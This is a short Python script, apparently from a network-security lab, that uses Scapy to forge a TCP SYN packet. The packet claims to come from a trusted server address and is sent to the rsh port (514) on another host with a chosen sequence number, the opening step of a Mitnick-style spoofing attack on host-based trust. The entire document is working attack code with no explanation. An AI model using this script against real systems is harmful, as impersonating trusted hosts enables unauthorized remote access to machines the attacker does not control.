
from scapy.all import *

x_ip = "192.168.159.130" 
x_port = 514
srv_ip = "192.168.159.132"
srv_port = 1023

ip = IP(src = srv_ip , dst = x_ip)
tcp = TCP(sport = srv_port , dport = x_port , flags = "S" , seq = 3821295314)

pkt = ip/tcp

ls(pkt)
send(pkt , verbose = 0)

